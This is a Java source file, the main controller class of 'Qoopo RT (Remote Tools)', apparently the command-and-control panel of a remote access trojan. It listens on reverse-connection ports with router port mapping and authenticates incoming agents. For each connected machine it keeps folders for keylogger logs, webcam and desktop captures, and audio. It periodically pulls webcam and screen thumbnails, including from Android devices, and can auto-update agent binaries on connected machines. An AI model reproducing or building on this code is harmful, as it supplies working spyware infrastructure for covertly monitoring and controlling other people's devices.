package qooport.avanzado;

import comunes.Accion;
import comunes.Configuracion;
import java.awt.BorderLayout;
import java.awt.Desktop;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.BadLocationException;
import network.ConexionServer;
import qooport.Global;
import qooport.asociado.Asociado;
import qooport.listener.ServListener;
import qooport.modulos.archivos.anterior.DescargaArchivo;
import qooport.modulos.archivos.anterior.SubirArchivo;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.MapearPuertos;
import qooport.utilidades.Notificaciones;
import qooport.utilidades.Perfil;
import qooport.utilidades.Protocolo;
import qooport.utilidades.SerializarUtil;
import qooport.utilidades.Util;
import qooport.utilidades.cifrado.Encriptacion;
import qooport.utilidades.contador.ContadorBPS;

public class QoopoRT {

    public static String version = "v 1.5.7";
    public static boolean MOSTRAR_NOTIFICACION = false;
    public static final HashMap<String, Asociado> SERVIDORES = new HashMap();
    public static List<DescargaArchivo> listaDescargas = new ArrayList<>();
    public static List<SubirArchivo> listaSubidas = new ArrayList<>();
    public static List<Accion> accionesDescarga; //acciones a ejecutarse cuadno se completa una descarga de archivo, como volver a listar la carpeta actual
    public static List<Accion> accionesSubida;// acciones a ejecutarse cuadno se completa una carga de archivo
    public static QoopoRT instancia;
    public static String tipoLetra = "Arial";

    private List<MapearPuertos> mapeos = new ArrayList<>();

    public static void iniciar() {
        instancia = new QoopoRT();
    }

    public static void agregarAccionDescarga(Accion accion) {
        if (accionesDescarga == null) {
            accionesDescarga = new ArrayList<>();
        }
        accionesDescarga.add(accion);
    }

    public static void eliminarAccionDescarga(Accion accion) {
        if (accionesDescarga != null) {
            accionesDescarga.remove(accion);
        }
    }

    public static void agregarAccionCarga(Accion accion) {
        if (accionesSubida == null) {
            accionesSubida = new ArrayList<>();
        }
        accionesSubida.add(accion);
    }

    public static void eliminarAccionCarga(Accion accion) {
        if (accionesSubida != null) {
            accionesSubida.remove(accion);
        }
    }

    public static void ejecutarAccionesDescarga() {
        try {
            for (Accion accion : accionesDescarga) {
                accion.ejecutar();
            }
        } catch (Exception e) {

        }
    }

    public static void ejecutarAccionesCarga() {
        try {
            for (Accion accion : accionesSubida) {
                accion.ejecutar();
            }
        } catch (Exception e) {

        }
    }
    private final TareaMiniatura hiloMiniatura = new TareaMiniatura();
    private ScheduledExecutorService programadorMiniatura;
    public ContadorBPS contadorSubida;
    public ContadorBPS contadorBajada;
    public ContadorBPS contadorTotalBajada;
    public ContadorBPS contadorTotalSubida;
    private List<ServListener> listaConexiones = new ArrayList();
    private ModoAvanzado ventana = null;
    private List<Perfil> perfiles;
    private Configuracion config;
    private boolean escuchando = false;

    public QoopoRT() {
        instancia = this;
        iniciarComponente();
    }

    public File getDirEquipos() {
        try {
            File f = null;
            String dir = (String) config.obtenerParametro("dirEquipos");
            if (dir == null) {
                f = new File("equipos");
                if (!f.exists()) {
                    f.mkdir();
                }
                config.agregarParametro("dirEquipos", f.getAbsolutePath());
            } else {
                f = new File(dir);
            }
            return f;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private void iniciarComponente() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
        System.setProperty("java.net.preferIPv4Stack", "true");
        Global.extraerLibs();
        Global.cargarPlugin();

        contadorBajada = new ContadorBPS("Ancho de banda descarga", "", "/s", GuiUtil.crearJLabel("", "Progreso global de descarga de archivos", Util.cargarIcono16("/resources/down_arrow.png")), ContadorBPS.BYTES, false);
        contadorBajada.start();
        contadorSubida = new ContadorBPS("Ancho de banda subida", "", "/s", GuiUtil.crearJLabel("", "Progreso global de carga de archivos", Util.cargarIcono16("/resources/up_arrow.png")), ContadorBPS.BYTES, false);
        contadorSubida.start();
        contadorTotalBajada = new ContadorBPS("Bytes descargados", "", "", null, ContadorBPS.BYTES, true);
        contadorTotalBajada.start();
        contadorTotalSubida = new ContadorBPS("Bytes subidos", "", "", null, ContadorBPS.BYTES, true);
        contadorTotalSubida.start();
        iniciarCliente();

        int largotitulo = 20;
        QoopoRT.this.ponerEstado(Util.crearTituloString("", largotitulo));
        QoopoRT.this.ponerEstado(Util.crearTituloString("QoopoRT " + QoopoRT.version, largotitulo));
        QoopoRT.this.ponerEstado(Util.crearTituloString("", largotitulo));
        QoopoRT.this.ponerEstado(Util.crearTituloString("Fecha:" + sdf.format(new Date()), largotitulo));
        QoopoRT.this.ponerEstado(Util.crearTituloString("", largotitulo));

        Global.extraerGeoIp();
        perfiles = this.cargarArchivoPerfiles();
        this.actualizarListaPerfiles();
        config = new Configuracion();
        config.setSegundos(30);
        try {
            config = (Configuracion) SerializarUtil.leerObjeto("config.dat");
            ventana.getPanelNoIp().getTxtNoIpUsuario().setText(config.getNoIpUsuario());
            ventana.getPanelNoIp().getTxtNoIpPass().setText(config.getNoIpPassword());
            ventana.getChkVistaPrevia().setSelected(config.isVistasPrevias());
            ventana.getChkVistaPreviaWC().setSelected((boolean) config.obtenerParametro("vistaPreviaWC"));
            ventana.getChkVistaPreviaWCAndroid().setSelected((boolean) config.obtenerParametro("vistaPreviaWCAndroid"));
            ventana.getChkGuardarMiniaturas().setSelected((boolean) config.obtenerParametro("guardarminiaturas"));
            ventana.getPnlConfiguracion().getTxtRutaArchivo().setText(config.getRutaArchivo());
            ventana.getPnlConfiguracion().getTxtVersion().setText(config.getVersion());
            ventana.getPnlConfiguracion().getChkActualizarserver().setSelected(config.isActualizarserver());
            ventana.getPnlConfiguracion().getChkPedirArchivoOffline().setSelected(config.isPedirArchivoOffline());
            ventana.getPnlConfiguracion().getIniciarArranque().setSelected((boolean) config.obtenerParametro("iniciarArranque"));
            ventana.getPnlConfiguracion().getTxtPassword().setText(Encriptacion.descifra((byte[]) config.obtenerParametro("clave")));
            ventana.getPnlConfiguracion().getTxtIps().setText(config.obtenerParametro("ipsbloqueadas").toString());
            ventana.getPnlConfiguracion().getChkNotificar().setSelected((boolean) config.obtenerParametro("notificacion"));
            ventana.getPnlConfiguracion().getTxtRutaEquipos().setText(getDirEquipos().getAbsolutePath());
            MOSTRAR_NOTIFICACION = (boolean) config.obtenerParametro("notificacion");
            ventana.getSegundos().setValue(config.getSegundos());
        } catch (Exception e) {
        }

        //solo en vista avanzada
        if ((boolean) config.obtenerParametro("iniciarArranque")) {
            ConectaODesconectaPuerto();
        }

    }

    private List<Perfil> cargarArchivoPerfiles() {
        List<Perfil> tmp = new ArrayList<>();
        File archivo = new File("perfiles.dat");
        if (archivo.exists()) {
            try {
                tmp = (List) SerializarUtil.leerObjeto(new FileInputStream(archivo));
            } catch (IOException | ClassNotFoundException ex) {
                ex.printStackTrace();
            }
        }
        return tmp;
    }

    public void guardarArchivosPerfiles(List<Perfil> lista) {
        try {
            File archivo = new File("perfiles.dat");
            if (archivo.exists()) {
                archivo.delete();
            }
            SerializarUtil.escribirArchivo(lista, archivo.getAbsolutePath());
        } catch (IOException ex) {
        }
    }

    public void addDescarga(DescargaArchivo ds) {
        try {
            ModoAvanzado.getPaneTransferencia().insertComponent(ds);
            ModoAvanzado.getPaneTransferencia().getStyledDocument().insertString(ModoAvanzado.getPaneTransferencia().getDocument().getLength(), "\n", null);
        } catch (BadLocationException ex) {
        }
    }

    public void btnDescargasAbrirCarpeta(ActionEvent evt) {
        try {
            Desktop.getDesktop().open(getDirEquipos());
        } catch (IOException ex) {
        }
    }

    public void btnTerminarCompletosAP(ActionEvent evt) {
        for (DescargaArchivo ds : QoopoRT.listaDescargas) {
            if (ds.getBtnAbrir().isEnabled()) {
                ds.btnCerrarActionP(null);
            }
        }

        for (SubirArchivo ds : QoopoRT.listaSubidas) {
            if (ds.getBtnAbrir().isEnabled()) {
                ds.btnCerrarActionP(null);
            }
        }
    }

    public void iniciarCliente() {
        try {
            Configuracion config2 = (Configuracion) SerializarUtil.leerObjeto("config.dat");
            String claveqoopo = Encriptacion.descifra((byte[]) config2.obtenerParametro("clave"));
            if (claveqoopo != null && !claveqoopo.isEmpty()) {
                String clave = null;
                JPanel pnlPwd = new JPanel();
                pnlPwd.setLayout(new BorderLayout());
                JPasswordField pwd = new JPasswordField(10);
                pwd.setFont(new Font(tipoLetra, 1, 18));
                pnlPwd.add(GuiUtil.crearJLabel("Ingrese clave de acceso"), BorderLayout.CENTER);
                pnlPwd.add(pwd, BorderLayout.SOUTH);
                pwd.requestFocus();
                int action = JOptionPane.showConfirmDialog(null, pnlPwd, "Login", JOptionPane.OK_CANCEL_OPTION, JOptionPane.WARNING_MESSAGE, Util.cargarIcono32("/resources/lock3.png"));
                if (action != JOptionPane.OK_OPTION) {
                    System.exit(0);
                } else {
                    clave = new String(pwd.getPassword());
                }
                if (clave == null || !clave.equals(claveqoopo)) {
                    JOptionPane.showMessageDialog(null, "Clave incorrecta");
                    System.exit(0);
                }
            }

        } catch (Exception e) {
        }

        ventana = new ModoAvanzado("Qoopo RT (Remote Tools)", this);
    }

    public void autenticar(Asociado servidor) {
        //si no esta escuchando elimino la instancia de este servidor
        if (escuchando) {
            this.ponerEstado("Autenticando con nuevo equipo [" + servidor.getIp() + "]");
            servidor.enviarComando(Protocolo.AUTENTICAR, "");
            Util.esperar(500);
            servidor.enviarComando(Protocolo.AUTENTICAR, Encriptacion.MD5(""));
            Util.esperar(500);
            for (Perfil p : this.perfiles) {
                servidor.enviarComando(Protocolo.AUTENTICAR, (String) p.obtenerParametro("password"));
                Util.esperar(500);
                servidor.enviarComando(Protocolo.AUTENTICAR, Encriptacion.MD5((String) p.obtenerParametro("password")));
                Util.esperar(500);
            }
        } else {
            servidor.CierraConexion();
            servidor.DETENER();
        }
    }

    public void iniciarServicio() {
        if (escuchando) {
            return;
        }
        List<String> puertosUsados = new ArrayList<>();
        mapeos.clear();
        this.listaConexiones.clear();
        int tipoConexion = 0;
        String tipoConexionSTR = null;

        if (perfiles != null && !perfiles.isEmpty()) {
            for (Perfil p : this.perfiles) {

                boolean ssl = false;

                try {
                    ssl = Boolean.valueOf((String) p.obtenerParametro("ssl"));
                } catch (Exception e) {
                    ssl = false;
                }

                try {
                    int tipo = (int) p.obtenerParametro("tipoConexion");
                    if (tipo == 0) {
                        tipoConexion = ConexionServer.TCP;
                        tipoConexionSTR = "TCP";
                    } else if (tipo == 1) {
                        tipoConexion = ConexionServer.UDP;
                        tipoConexionSTR = "UDP";
                    }
                } catch (Exception e) {
                    tipoConexion = ConexionServer.TCP;
                    tipoConexionSTR = "TCP";
                }

                if (Boolean.valueOf((String) p.obtenerParametro("inversa"))) {
                    try {
                        if (!puertosUsados.contains((String) p.obtenerParametro("puerto") + "|" + tipoConexion)) {
                            //redirecciono los puetos en el router
                            MapearPuertos mapeo = new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto")), tipoConexion);
                            mapeo.start();
                            mapeos.add(mapeo);
                            ServListener c1 = new ServListener(Integer.valueOf((String) p.obtenerParametro("puerto")), tipoConexion, ssl);
                            c1.start();
                            if (!listaConexiones.contains(c1)) {
                                listaConexiones.add(c1);
                            }
                            puertosUsados.add((String) p.obtenerParametro("puerto") + "|" + tipoConexion);
                            this.ponerEstado("Esperando conexiones en el puerto [" + (String) p.obtenerParametro("puerto") + "]" + " (" + tipoConexionSTR + ")");
                        }
                    } catch (IOException ex) {
                        ex.printStackTrace();
                        this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto") + "]" + " (" + tipoConexionSTR + ")");
                    }
                }
            }
            escuchando = true;
            if (ventana != null) {
                ventana.getBtnIniciar().setText("Detener");
                ventana.getBtnIniciar().setIcon(Util.cargarIcono16("/resources/stop_close.png"));
            }
        } else {
            JOptionPane.showMessageDialog(null, "No hay perfiles creados. Debe crear un perfil en la Interfaz \"Crear Servidor\"");
        }

        if (ventana != null) {
            programadorMiniatura = Executors.newScheduledThreadPool(1);
            programadorMiniatura.scheduleAtFixedRate(hiloMiniatura, config.getSegundos(), config.getSegundos(), TimeUnit.SECONDS);
        }
    }

    public void detenerServicio() {
        if (!escuchando) {
            return;
        }
        try {
            synchronized (QoopoRT.SERVIDORES) {
                for (Asociado serv : QoopoRT.SERVIDORES.values()) {
                    serv.DETENER();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (ServListener c : this.listaConexiones) {
            c.stopPara();
        }
        for (MapearPuertos c : this.mapeos) {
            c.liberarMap();
        }
        mapeos.clear();
        this.listaConexiones.clear();
        escuchando = false;
        try {
            ventana.getBtnIniciar().setText("Iniciar");
            ventana.getBtnIniciar().setIcon(Util.cargarIcono16("/resources/start.png"));
        } catch (Exception e) {
        }
        //me aseguro de ADMIN_ARCHIVOS_ELIMINAR los SERVIDORES que queden
        try {
            synchronized (QoopoRT.SERVIDORES) {
                for (Asociado serv : QoopoRT.SERVIDORES.values()) {
                    ventana.eliminarAgente(serv, true);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        SERVIDORES.clear();
        programadorMiniatura = null;
    }

    public void ConectaODesconectaPuerto() {
        if (!escuchando) {
            iniciarServicio();
        } else {
            detenerServicio();
        }
    }

    public void agregarAgente(Asociado agente) {
        try {
            ventana.getEquipos().agregarServidor(agente);
            QoopoRT.SERVIDORES.put(agente.getIdentificador(), agente);
            File ds = new File(getDirEquipos().getAbsoluteFile(), agente.getUsuario() + "_" + agente.getHost());
            if (!ds.exists()) {
                ds.mkdirs();
            }
            File da = new File(ds, "audio");
            if (!da.exists()) {
                da.mkdirs();
            }
            File dw = new File(ds, "descargas");
            if (!dw.exists()) {
                dw.mkdirs();
            }
            File di = new File(ds, "imagenes");
            if (!di.exists()) {
                di.mkdirs();
            }
            File dwc = new File(di, "webcam");
            if (!dwc.exists()) {
                dwc.mkdirs();
            }
            File dwe = new File(di, "escritorio");
            if (!dwe.exists()) {
                dwe.mkdirs();
            }
            File dk = new File(ds, "keylogger");
            if (!dk.exists()) {
                dk.mkdirs();
            }
            File dInfo = new File(ds, "info");
            if (!dInfo.exists()) {
                dInfo.mkdirs();
            }
            File dCapturas = new File(ds, "capturas");
            if (!dCapturas.exists()) {
                dCapturas.mkdirs();
            }

            agente.setdPrincipal(ds);
            agente.setdDescargas(dw);
            agente.setdImagenes(di);
            agente.setdWebCam(dwc);
            agente.setdEscritorio(dwe);
            agente.setdAudio(da);
            agente.setfKeylogger(dk);
            agente.setdInfor(dInfo);
            agente.setdCapturas(dCapturas);
//            serv.setfKeylogger(new File(dk, "keylogger.txt"));
            if (ventana.getChkVistaPrevia().isSelected()) {
                agente.pedirPantallaMiniatura();
            }
            if (ventana.getChkVistaPreviaWC().isSelected()) {
                if (ventana.getChkVistaPreviaWCAndroid().isSelected()) {
                    if (agente.isAndroid()) {
                        agente.pedirWebCamMiniatura();
                    }
                } else {
                    agente.pedirWebCamMiniatura();
                }
            }
            //QoopoRT.this.ponerEstado("Se conectó servidor: [" + serv.getInformacion() + " - (" + serv.getIp() + ") ]");
            QoopoRT.this.ponerEstado("Se conectó agente: " + agente.getInfoIP());
            boolean actualizadoServer = false;
            //actualizo automaticamente el servidor
            if (!agente.isAndroid()
                    && ventana.getPnlConfiguracion().getChkActualizarserver().isSelected()) {
                try {
                    String s_version = agente.getDatos()[9].trim();
//                        String s_version = datos[11].toString().replaceAll("\\.", "");
                    String s_version2 = ventana.getPnlConfiguracion().getTxtVersion().getText().trim();
//                        int version = Integer.valueOf(s_version);
//                        int version2 = Integer.valueOf(s_version2.replaceAll("\\.", ""));
//                        if (version < version2) {

                    if (!s_version.equals(s_version2)) {
                        if (!new File(ventana.getPnlConfiguracion().getTxtRutaArchivo().getText()).exists()) {
                            QoopoRT.this.ponerEstado("Se debe actualizar el agente (" + agente.getInformacion() + ") de la versión " + s_version + " a la version " + s_version2 + ". Pero el archivo indicado no existe.");
                        } else {
                            actualizadoServer = true;
                            agente.crearCarpeta("a", "<server>/../");
                            agente.actualizarServidor(ventana.getPnlConfiguracion().getTxtRutaArchivo().getText(), "<server>/../a");
                            QoopoRT.this.ponerEstado("Se va a actualizar automáticamente el agente (" + agente.getInformacion() + ") de la version " + s_version + "   a la version " + s_version2);
                        }
                    }
                } catch (Exception e) {
                }
            }
            //pido recibir automaticamente el archivo de capturas offline
            if (!actualizadoServer && ventana.getPnlConfiguracion().getChkPedirArchivoOffline().isSelected()) {
                try {
                    agente.descargarListaOffline();
                    QoopoRT.this.ponerEstado("Se solicita al agente (" + agente.getInformacion() + " descargar el archivo de captura offline");
                } catch (Exception e) {
                }
            }
            if (MOSTRAR_NOTIFICACION) {
                Notificaciones.mostrarNotificacion(agente);
//                Notificaciones.sondidoConectar();
            }
            agente.enviarComando(Protocolo.GET_INFO_COMPLETA);//pido la info completa para almacenarla en el directorio
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void actualizarDatosServidor(Asociado serv) {
        if (ventana != null) {
            boolean encontrado = ventana.getEquipos().actualizarDatosServidor(serv);
            if (!encontrado) {
                this.agregarAgente(serv);
            }
            if (ventana.getServerSeleccionado().equals(serv.getIdentificador())) {
                ventana.mostrarMiniatura(serv);
            }
            QoopoRT.this.ventana.setTitle("Qoopo RT (Remote Tools) [" + QoopoRT.SERVIDORES.size() + " equipos conectados]");
        }
    }

    public void ponerEstado(String mensaje) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
            SimpleDateFormat sdf2 = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
            ventana.getTxtLog().append(sdf.format(new Date()) + " > " + mensaje + "\n");
            ventana.getTxtLog().setCaretPosition(ventana.getTxtLog().getDocument().getLength());
            try {
                BufferedWriter out = null;
                try {
                    out = new BufferedWriter(new FileWriter("log.txt", true));
                    out.write(sdf2.format(new Date()) + " > " + mensaje + "\n");
                } catch (Exception e) {
                } finally {
                    if (out != null) {
                        out.close();
                    }
                }
            } catch (Exception e) {
            }
        } catch (Exception e) {
        }
    }

    public void eliminarPerfil() {
        String nombre = null;
        try {
            nombre = ventana.getTblPerfiles().getValueAt(ventana.getTblPerfiles().getSelectedRow(), 1).toString();
        } catch (Exception e) {
        }
        try {
            for (Perfil p : this.perfiles) {
                if ((nombre != null && nombre.equals((String) p.obtenerParametro("nombre")))
                        || (nombre == null && (String) p.obtenerParametro("nombre") == null)) {
                    perfiles.remove(p);
                }
            }
        } catch (Exception e) {
        }
        this.actualizarListaPerfiles();
    }

    public void actualizarListaPerfiles() {
        if (ventana != null) {
            for (int i = ventana.getTblPerfiles().getRowCount() - 1; i > -1; i--) {
                ((DefaultTableModel) ventana.getTblPerfiles().getModel()).removeRow(i);
            }
            String tipoConexion;
            int i;
//            String version2;
            String ssl;
            for (Perfil p : perfiles) {
                i = 0;
                tipoConexion = "N/A";
                try {
                    i = (int) p.obtenerParametro("tipoConexion");
                } catch (Exception e) {
//                i = ConexionServer.TCP;
                }
                if (i == 0) {
                    tipoConexion = "TCP";
                } else if (i == 1) {
                    tipoConexion = "UDP";
                }

//                try {
//                    version2 = Boolean.valueOf((String) p.obtenerParametro("version_objeto")) ? "SI" : "NO";
//                } catch (Exception e) {
//                    version2 = "NO";
//                }
                try {
                    ssl = Boolean.valueOf((String) p.obtenerParametro("ssl")) ? "SI" : "NO";
                } catch (Exception e) {
                    ssl = "NO";
                }

                ((DefaultTableModel) ventana.getTblPerfiles().getModel()).addRow(
                        new Object[]{
                            null,
                            (String) p.obtenerParametro("nombre"),
                            (String) p.obtenerParametro("puerto"),
                            tipoConexion,
                            ssl
                        });
            }
        }
        this.guardarArchivosPerfiles(perfiles);
    }

    public boolean contieneIpBloqueada(String ip) {
        try {
            return ventana.getPnlConfiguracion().getTxtIps().getText().contains(ip);
        } catch (Exception e) {
            return false;
        }
    }

    // </editor-fold>
    // <editor-fold defaultstate="collapsed" desc="Getters y Setters">
    public ModoAvanzado getVentana() {
        return ventana;
    }

    public void setVentana(ModoAvanzado ventana) {
        this.ventana = ventana;
    }

    public Configuracion getConfig() {
        return config;
    }

    public void setConfig(Configuracion config) {
        this.config = config;
    }

    public void cargarPerfiles() {
        perfiles = cargarArchivoPerfiles();
    }

    public ContadorBPS getContadorSubida() {
        return contadorSubida;
    }

    public void setContadorSubida(ContadorBPS contadorSubida) {
        this.contadorSubida = contadorSubida;
    }

    public ContadorBPS getContadorBajada() {
        return contadorBajada;
    }

    public void setContadorBajada(ContadorBPS contadorBajada) {
        this.contadorBajada = contadorBajada;
    }

    public ContadorBPS getContadorTotalBajada() {
        return contadorTotalBajada;
    }

    public void setContadorTotalBajada(ContadorBPS contadorTotalBajada) {
        this.contadorTotalBajada = contadorTotalBajada;
    }

    public ContadorBPS getContadorTotalSubida() {
        return contadorTotalSubida;
    }

    public void setContadorTotalSubida(ContadorBPS contadorTotalSubida) {
        this.contadorTotalSubida = contadorTotalSubida;
    }
    // </editor-fold>

    // <editor-fold defaultstate="collapsed" desc="HILOS">
    public class TareaMiniatura extends Thread {

        public TareaMiniatura() {
        }

        @Override
        public void run() {
            try {
                if (ventana.getChkVistaPreviaWC().isSelected()) {
                    for (Asociado tmp : SERVIDORES.values()) {
                        if (ventana.getChkVistaPreviaWCAndroid().isSelected()) {
                            if (tmp.isAndroid()) {
                                tmp.pedirWebCamMiniatura();
                            }
                        } else {
                            tmp.pedirWebCamMiniatura();
                        }
                    }
                } else//desactivo , para apagar la camara
                {
                    for (Asociado tmp : SERVIDORES.values()) {
                        if (tmp.isPidiendoVistaPreviaWC()) {
                            tmp.detenerWebCamMiniatura();
                        }
                    }
                }
                if (ventana.getChkVistaPrevia().isSelected()) {
                    for (Asociado tmp : SERVIDORES.values()) {
                        tmp.pedirPantallaMiniatura();
                    }
                }
            } catch (Exception e) {
            }
        }
    }
    // </editor-fold>
}
